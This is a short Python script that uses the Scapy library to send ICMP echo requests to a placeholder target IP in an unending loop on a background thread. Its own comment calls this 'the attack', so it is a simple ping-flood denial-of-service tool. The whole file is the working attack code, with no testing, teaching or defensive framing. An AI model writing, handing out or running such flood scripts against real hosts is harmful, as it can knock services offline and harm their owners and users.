import scapy.all as scapy
import threading
import time

target_ip = "XXX.XXX.XXX.XXX"  # Replace with the actual IP address of your server

def send_icmp_packet():
    while True:
        # Crafting an ICMP Echo Request packet using Scapy
        packet = scapy.IP(dst=target_ip) / scapy.ICMP()

        # Sending the packet
        scapy.send(packet, verbose=False)

def main():
    # Create a thread for the ICMP packet sender
    icmp_thread = threading.Thread(target=send_icmp_packet)

    # Start the ICMP packet sender thread
    icmp_thread.start()

    try:
        # Keep the attack running
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("Script stopped manually.")

if __name__ == "__main__":
    main()